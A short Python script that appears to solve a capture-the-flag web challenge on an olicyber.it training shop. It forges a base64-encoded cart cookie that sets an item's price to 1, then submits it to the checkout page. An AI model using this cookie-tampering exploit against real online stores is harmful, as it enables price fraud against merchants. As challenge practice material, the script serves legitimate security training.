import requests
import base64

url = "http://meme_shop.challs.olicyber.it/cart.php"

checkout_url = "/checkout.php"

session = requests.Session()

session.cookies.set('PHPSESSID', "uo387d5cd12fj6dkihr8ob7mb4")

print(session.cookies.values())

response = session.get(url)
print(session.cookies.get_dict())


cart = """{"Seal of approval":{"price":1,"qty":1,"item_id":5}}"""

b64_cart = base64.b64encode(cart.encode()).decode()
print(b64_cart)
session.cookies.set('cart', b64_cart)

print(session.cookies.get_dict())


response = session.post(url+checkout_url)
print(response.status_code)
print(response.text)
print(session.cookies.get_dict())


